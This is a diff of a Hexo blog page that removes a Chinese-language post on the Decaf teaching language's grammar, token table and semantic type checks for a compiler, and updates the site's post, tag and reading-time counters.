-<li>void 类型仅用于函数的返回类型 MethodType，不用于变量声明 Type</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExternType = ( <span class="built_in">string</span> | Type ) .</span><br><span class="line">Type = ( <span class="keyword">int</span> | <span class="keyword">bool</span> ) .</span><br><span class="line">MethodType = ( <span class="keyword">void</span> | Type ) .</span><br></pre></td></tr></table></figure>
-<p>Decaf 有2种数组：整数，布尔数组</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ArrayType = <span class="string">&quot;[&quot;</span> int_lit <span class="string">&quot;]&quot;</span> Type .</span><br></pre></td></tr></table></figure>
-<p>Decaf 程序可以访问链接的外部函数（例如：用 C 实现的 Decaf 标准库函数），以及作为外部函数从 Decaf 程序内部访问的函数（目前，只允许声明外部函数，无法声明外部数据）</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Externs    = &#123; ExternDefn &#125; .</span><br><span class="line">ExternDefn = <span class="keyword">extern</span> func identifier <span class="string">&quot;(&quot;</span> [ &#123; ExternType &#125;+, ] <span class="string">&quot;)&quot;</span> MethodType <span class="string">&quot;;&quot;</span> .</span><br></pre></td></tr></table></figure>
-<p>Decaf 具有全局变量，其范围仅限于其包，出现在任何方法声明之前</p>
-<p>Decaf 中的全局变量称为字段声明，它们可以是没有初始化的简单声明（假定编译器初始化为零），也可以使用常量赋值来声明非数组变量，变量始终使用保留字 <code>var</code> 定义</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FieldDecls = &#123; FieldDecl &#125; .</span><br><span class="line">FieldDecl  = var &#123; identifier &#125;+, Type <span class="string">&quot;;&quot;</span> . <span class="comment">/* 简单变量(未初始化) */</span></span><br><span class="line">FieldDecl  = var &#123; identifier &#125;+, ArrayType <span class="string">&quot;;&quot;</span> . <span class="comment">/* 数组变量 */</span></span><br><span class="line">FieldDecl  = var identifier Type <span class="string">&quot;=&quot;</span> Constant <span class="string">&quot;;&quot;</span> . <span class="comment">/* 简单变量(初始化) */</span></span><br></pre></td></tr></table></figure>
-<p>Decaf 中的函数或方法以保留字 <code>func</code> 开头，然后是方法的名称，括号中是参数列表，后跟方法的返回类型</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MethodDecls = &#123; MethodDecl &#125; .</span><br><span class="line">MethodDecl  = func identifier <span class="string">&quot;(&quot;</span> [ &#123; identifier Type &#125;+, ] <span class="string">&quot;)&quot;</span> MethodType Block .</span><br></pre></td></tr></table></figure>
-<p>Decaf 的块有两个部分，一个用于局部变量定义，一个用于语句</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Block = <span class="string">&quot;&#123;&quot;</span> VarDecls Statements <span class="string">&quot;&#125;&quot;</span> .</span><br></pre></td></tr></table></figure>
-<p>Decaf 的语句有如下几种：</p>
-<ul>
-<li>赋值语句</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Statement = Assign <span class="string">&quot;;&quot;</span> .</span><br><span class="line">Assign    = Lvalue <span class="string">&quot;=&quot;</span> Expr .</span><br><span class="line">Lvalue    = identifier | identifier <span class="string">&quot;[&quot;</span> Expr <span class="string">&quot;]&quot;</span> . <span class="comment">/* 变量 | 数组[表达式] */</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>函数调用</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Statement  = MethodCall <span class="string">&quot;;&quot;</span> .</span><br><span class="line">MethodCall = identifier <span class="string">&quot;(&quot;</span> [ &#123; MethodArg &#125;+, ] <span class="string">&quot;)&quot;</span> .</span><br><span class="line">MethodArg  = Expr | string_lit .</span><br></pre></td></tr></table></figure>
-<ul>
-<li>IF-ELSE 语句</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Statement = <span class="keyword">if</span> <span class="string">&quot;(&quot;</span> Expr <span class="string">&quot;)&quot;</span> Block [ <span class="keyword">else</span> Block ] .</span><br></pre></td></tr></table></figure>
-<ul>
-<li>WHILE 语句</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Statement =  <span class="keyword">while</span> <span class="string">&quot;(&quot;</span> Expr <span class="string">&quot;)&quot;</span> Block .</span><br></pre></td></tr></table></figure>
-<ul>
-<li>FOR 语句</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Statement = <span class="keyword">for</span> <span class="string">&quot;(&quot;</span> &#123; Assign &#125;+, <span class="string">&quot;;&quot;</span> Expr <span class="string">&quot;;&quot;</span> &#123; Assign &#125;+, <span class="string">&quot;)&quot;</span> Block .</span><br></pre></td></tr></table></figure>
-<ul>
-<li>RETURN 语句</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Statement = <span class="keyword">return</span> [ <span class="string">&quot;(&quot;</span> [ Expr ] <span class="string">&quot;)&quot;</span> ] <span class="string">&quot;;&quot;</span> .</span><br></pre></td></tr></table></figure>
-<ul>
-<li>BREAK 语句</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Statement = <span class="keyword">break</span> <span class="string">&quot;;&quot;</span> .</span><br></pre></td></tr></table></figure>
-<ul>
-<li>CONTINUE 语句</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Statement = <span class="keyword">continue</span> <span class="string">&quot;;&quot;</span> .</span><br></pre></td></tr></table></figure>
-<p>Decaf 表达式中的基本值是操作数，也可以是各种表达式的组合</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Expr = identifier .</span><br><span class="line">Expr = MethodCall .</span><br><span class="line">Expr = Constant .</span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BinaryOperator = ( ArithmeticOperator | BooleanOperator ) .</span><br><span class="line">ArithmeticOperator = ( <span class="string">&quot;+&quot;</span> | <span class="string">&quot;-&quot;</span> | <span class="string">&quot;*&quot;</span> | <span class="string">&quot;/&quot;</span> | <span class="string">&quot;&lt;&lt;&quot;</span> | <span class="string">&quot;&gt;&gt;&quot;</span> | <span class="string">&quot;%&quot;</span> ) .</span><br><span class="line">BooleanOperator = ( <span class="string">&quot;==&quot;</span> | <span class="string">&quot;!=&quot;</span> | <span class="string">&quot;&lt;&quot;</span> | <span class="string">&quot;&lt;=&quot;</span> | <span class="string">&quot;&gt;&quot;</span> | <span class="string">&quot;&gt;=&quot;</span> | <span class="string">&quot;&amp;&amp;&quot;</span> | <span class="string">&quot;||&quot;</span> ) .</span><br><span class="line"></span><br><span class="line">Expr = Expr BinaryOperator Expr . <span class="comment">/* 二元运算符 */</span></span><br><span class="line">Expr = UnaryOperator Expr . <span class="comment">/* 一元运算符 */</span></span><br><span class="line">Expr = <span class="string">&quot;(&quot;</span> Expr <span class="string">&quot;)&quot;</span> .</span><br></pre></td></tr></table></figure>
-<p>Decaf 中只有两个一元运算符：一个用于逻辑否定，另一个用于算术表达式的负数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UnaryOperator = ( UnaryNot | UnaryMinus ) .</span><br><span class="line">UnaryNot = <span class="string">&quot;!&quot;</span> .</span><br><span class="line">UnaryMinus = <span class="string">&quot;-&quot;</span> .</span><br></pre></td></tr></table></figure>
-<p>Decaf 二元运算符分为布尔二元运算符和算术二元运算符</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BinaryOperator = ( ArithmeticOperator | BooleanOperator ) .</span><br><span class="line">ArithmeticOperator = ( <span class="string">&quot;+&quot;</span> | <span class="string">&quot;-&quot;</span> | <span class="string">&quot;*&quot;</span> | <span class="string">&quot;/&quot;</span> | <span class="string">&quot;&lt;&lt;&quot;</span> | <span class="string">&quot;&gt;&gt;&quot;</span> | <span class="string">&quot;%&quot;</span> ) .</span><br><span class="line">BooleanOperator = ( <span class="string">&quot;==&quot;</span> | <span class="string">&quot;!=&quot;</span> | <span class="string">&quot;&lt;&quot;</span> | <span class="string">&quot;&lt;=&quot;</span> | <span class="string">&quot;&gt;&quot;</span> | <span class="string">&quot;&gt;=&quot;</span> | <span class="string">&quot;&amp;&amp;&quot;</span> | <span class="string">&quot;||&quot;</span> ) .</span><br></pre></td></tr></table></figure>
-<p>一元运算符 <code>UnaryMinus</code> 具有最高优先级，优先级定义如下：</p>
-<ul>
-<li><code>UnaryMinus</code></li>
-<li><code>UnaryNot</code></li>
-<li><code>* / % &lt;&lt; &gt;&gt;</code></li>
-<li><code>+ -</code></li>
-<li><code>== != &lt; &lt;= &gt; &gt;=</code></li>
-<li><code>&amp;&amp;</code></li>
-<li><code>||</code></li>
-</ul>
-<p>Decaf 的 token 表列如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">T_AND            &amp;&amp;</span><br><span class="line">T_ASSIGN         =</span><br><span class="line">T_BOOLTYPE       <span class="keyword">bool</span></span><br><span class="line">T_BREAK          <span class="keyword">break</span></span><br><span class="line">T_CHARCONSTANT   char_lit (see section on Character literals)</span><br><span class="line">T_COMMA          ,</span><br><span class="line">T_COMMENT        comment</span><br><span class="line">T_CONTINUE       <span class="keyword">continue</span></span><br><span class="line">T_DIV            /</span><br><span class="line">T_DOT            .</span><br><span class="line">T_ELSE           <span class="keyword">else</span></span><br><span class="line">T_EQ             ==</span><br><span class="line">T_EXTERN         <span class="keyword">extern</span></span><br><span class="line">T_FALSE          <span class="literal">false</span></span><br><span class="line">T_FOR            <span class="keyword">for</span></span><br><span class="line">T_FUNC           func</span><br><span class="line">T_GEQ            &gt;=</span><br><span class="line">T_GT             &gt;</span><br><span class="line">T_ID             identifier (see section on Identifiers)</span><br><span class="line">T_IF             <span class="keyword">if</span></span><br><span class="line">T_INTCONSTANT    int_lit (see section on Integer literals)</span><br><span class="line">T_INTTYPE        <span class="keyword">int</span></span><br><span class="line">T_LCB            &#123;</span><br><span class="line">T_LEFTSHIFT      &lt;&lt;</span><br><span class="line">T_LEQ            &lt;=</span><br><span class="line">T_LPAREN         (</span><br><span class="line">T_LSB            [</span><br><span class="line">T_LT             &lt;</span><br><span class="line">T_MINUS          -</span><br><span class="line">T_MOD            %</span><br><span class="line">T_MULT           *</span><br><span class="line">T_NEQ            !=</span><br><span class="line">T_NOT            !</span><br><span class="line">T_NULL           null</span><br><span class="line">T_OR             ||</span><br><span class="line">T_PACKAGE        package</span><br><span class="line">T_PLUS           +</span><br><span class="line">T_RCB            &#125;</span><br><span class="line">T_RETURN         <span class="keyword">return</span></span><br><span class="line">T_RIGHTSHIFT     &gt;&gt;</span><br><span class="line">T_RPAREN         )</span><br><span class="line">T_RSB            ]</span><br><span class="line">T_SEMICOLON      ;</span><br><span class="line"><span class="function">T_STRINGCONSTANT <span class="title">string_lit</span> <span class="params">(see section on String literals)</span></span></span><br><span class="line"><span class="function">T_STRINGTYPE     <span class="built_in">string</span></span></span><br><span class="line"><span class="function">T_TRUE           <span class="literal">true</span></span></span><br><span class="line"><span class="function">T_VAR            var</span></span><br><span class="line"><span class="function">T_VOID           <span class="keyword">void</span></span></span><br><span class="line"><span class="function">T_WHILE          <span class="keyword">while</span></span></span><br><span class="line"><span class="function">T_WHITESPACE     <span class="title">whitespace</span> <span class="params">(see section on Whitespace)</span></span></span><br></pre></td></tr></table></figure>
-<p>Decaf 的规则表如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Program = Externs package identifier <span class="string">&quot;&#123;&quot;</span> FieldDecls MethodDecls <span class="string">&quot;&#125;&quot;</span> .</span><br><span class="line">Externs    = &#123; ExternDefn &#125; .</span><br><span class="line">ExternDefn = <span class="keyword">extern</span> func identifier <span class="string">&quot;(&quot;</span> [ &#123; ExternType &#125;+, ] <span class="string">&quot;)&quot;</span> MethodType <span class="string">&quot;;&quot;</span> .</span><br><span class="line">FieldDecls = &#123; FieldDecl &#125; .</span><br><span class="line">FieldDecl  = var &#123; identifier &#125;+, Type <span class="string">&quot;;&quot;</span> .</span><br><span class="line">FieldDecl  = var &#123; identifier &#125;+, ArrayType <span class="string">&quot;;&quot;</span> .</span><br><span class="line">FieldDecl  = var identifier Type <span class="string">&quot;=&quot;</span> Constant <span class="string">&quot;;&quot;</span> .</span><br><span class="line">MethodDecls = &#123; MethodDecl &#125; .</span><br><span class="line">MethodDecl  = func identifier <span class="string">&quot;(&quot;</span> [ &#123; identifier Type &#125;+, ] <span class="string">&quot;)&quot;</span> MethodType Block .</span><br><span class="line">Block = <span class="string">&quot;&#123;&quot;</span> VarDecls Statements <span class="string">&quot;&#125;&quot;</span> .</span><br><span class="line">VarDecls = &#123; VarDecl &#125; .</span><br><span class="line">VarDecl  = var &#123; identifier &#125;+, Type <span class="string">&quot;;&quot;</span> .</span><br><span class="line">Statements = &#123; Statement &#125; .</span><br><span class="line">Statement = Block .</span><br><span class="line">Statement = Assign <span class="string">&quot;;&quot;</span> .</span><br><span class="line">Assign    = Lvalue <span class="string">&quot;=&quot;</span> Expr .</span><br><span class="line">Lvalue    = identifier | identifier <span class="string">&quot;[&quot;</span> Expr <span class="string">&quot;]&quot;</span> .</span><br><span class="line">Statement  = MethodCall <span class="string">&quot;;&quot;</span> .</span><br><span class="line">MethodCall = identifier <span class="string">&quot;(&quot;</span> [ &#123; MethodArg &#125;+, ] <span class="string">&quot;)&quot;</span> .</span><br><span class="line">MethodArg  = Expr | string_lit .</span><br><span class="line">Statement = <span class="keyword">if</span> <span class="string">&quot;(&quot;</span> Expr <span class="string">&quot;)&quot;</span> Block [ <span class="keyword">else</span> Block ] .</span><br><span class="line">Statement =  <span class="keyword">while</span> <span class="string">&quot;(&quot;</span> Expr <span class="string">&quot;)&quot;</span> Block .</span><br><span class="line">Statement = <span class="keyword">for</span> <span class="string">&quot;(&quot;</span> &#123; Assign &#125;+, <span class="string">&quot;;&quot;</span> Expr <span class="string">&quot;;&quot;</span> &#123; Assign &#125;+, <span class="string">&quot;)&quot;</span> Block .</span><br><span class="line">Statement = <span class="keyword">return</span> [ <span class="string">&quot;(&quot;</span> [ Expr ] <span class="string">&quot;)&quot;</span> ] <span class="string">&quot;;&quot;</span> .</span><br><span class="line">Statement = <span class="keyword">break</span> <span class="string">&quot;;&quot;</span> .</span><br><span class="line">Statement = <span class="keyword">continue</span> <span class="string">&quot;;&quot;</span> .</span><br><span class="line">Expr = identifier .</span><br><span class="line">Expr = MethodCall .</span><br><span class="line">Expr = Constant .</span><br><span class="line">UnaryOperator = ( UnaryNot | UnaryMinus ) .</span><br><span class="line">UnaryNot = <span class="string">&quot;!&quot;</span> .</span><br><span class="line">UnaryMinus = <span class="string">&quot;-&quot;</span> .</span><br><span class="line">BinaryOperator = ( ArithmeticOperator | BooleanOperator ) .</span><br><span class="line">ArithmeticOperator = ( <span class="string">&quot;+&quot;</span> | <span class="string">&quot;-&quot;</span> | <span class="string">&quot;*&quot;</span> | <span class="string">&quot;/&quot;</span> | <span class="string">&quot;&lt;&lt;&quot;</span> | <span class="string">&quot;&gt;&gt;&quot;</span> | <span class="string">&quot;%&quot;</span> ) .</span><br><span class="line">BooleanOperator = ( <span class="string">&quot;==&quot;</span> | <span class="string">&quot;!=&quot;</span> | <span class="string">&quot;&lt;&quot;</span> | <span class="string">&quot;&lt;=&quot;</span> | <span class="string">&quot;&gt;&quot;</span> | <span class="string">&quot;&gt;=&quot;</span> | <span class="string">&quot;&amp;&amp;&quot;</span> | <span class="string">&quot;||&quot;</span> ) .</span><br><span class="line">Expr = Expr BinaryOperator Expr .</span><br><span class="line">Expr = UnaryOperator Expr .</span><br><span class="line">Expr = <span class="string">&quot;(&quot;</span> Expr <span class="string">&quot;)&quot;</span> .</span><br><span class="line">Expr = identifier <span class="string">&quot;[&quot;</span> Expr <span class="string">&quot;]&quot;</span> .</span><br><span class="line">ExternType = ( <span class="built_in">string</span> | Type ) .</span><br><span class="line">Type = ( <span class="keyword">int</span> | <span class="keyword">bool</span> ) .</span><br><span class="line">MethodType = ( <span class="keyword">void</span> | Type ) .</span><br><span class="line">BoolConstant = ( <span class="literal">true</span> | <span class="literal">false</span> ) .</span><br><span class="line">ArrayType = <span class="string">&quot;[&quot;</span> int_lit <span class="string">&quot;]&quot;</span> Type .</span><br><span class="line">Constant = ( int_lit | char_lit | BoolConstant ) .</span><br></pre></td></tr></table></figure>
-<p>确保在 Decaf 编译器中实现以下类型检查：</p>
-<ul>
-<li>二元和一元 <code>+ - * / % &gt;&gt; &lt;&lt; &lt; &gt; &lt;= &gt;=</code> 仅适用于整数表达式 </li>
-<li>二元和一元 <code>&amp;&amp; || !</code> 仅适用于布尔表达式</li>
-<li>二元 <code>== !=</code> 适用于任何类型，但两个操作数必须具有相同的类型</li>
-<li>对函数参数的赋值是有效的，应该像局部变量一样更改值</li>
-<li><code>&amp;&amp; ||</code> 和运算符短路（这已经在规范中指定）</li>
-<li>如果一个块中有多个 <code>return</code> 语句，则只使用第一个语句，但其他语句仍应进行类型检查</li>
-<li>为标量编制索引是一个语义错误：<code>&#123; var x int; x[0] = 1;&#125;</code></li>
-<li>使用布尔值编制索引是一个语义错误：<code>func main() int &#123; var x int; x = xs[true];&#125;</code></li>
-<li>对循环条件使用非布尔表达式是一个语义错误：<code>&#123; while (1) &#123;&#125; &#125;</code></li>
-<li>在 IF 语句条件中使用非布尔表达式是语义错误：<code>&#123; if (0) &#123;&#125; &#125;</code></li>
-<li>在具有 void 返回类型的函数中不允许使用带有表达式的 return 语句：<code>func foo() void &#123; return (1); &#125;</code></li>
-<li>在非 void 函数中没有表达式的 return 语句会生成默认返回值</li>
-<li>不能在表达式中使用 void 函数：<code>func foo() void &#123;&#125; func main() int &#123; if (foo()) &#123;&#125; &#125;</code></li>
-<li>不能调用参数数错误的函数</li>
-<li>查找变量类型的定义与分配给该变量的值之间存在类型不匹配的所有情况</li>
-<li>查找表达式格式正确的所有情况，其中二进制和一元运算符与关系运算符和相等运算符区分开来</li>
-<li>在将变量用作 decaf 程序中的左值或右值之前，请检查所有变量是否在正确的范围内定义</li>
-<li>检查方法中的 return 语句是否与方法定义中的返回类型匹配：<code>func foo() bool&#123;return(10);&#125;</code></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1554,7 +1475,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">277</span>
+          <span class="site-state-item-count">278</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1567,7 +1488,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-count">146</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -1608,7 +1529,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">58:25</span>
+    <span title="Reading time total">58:52</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
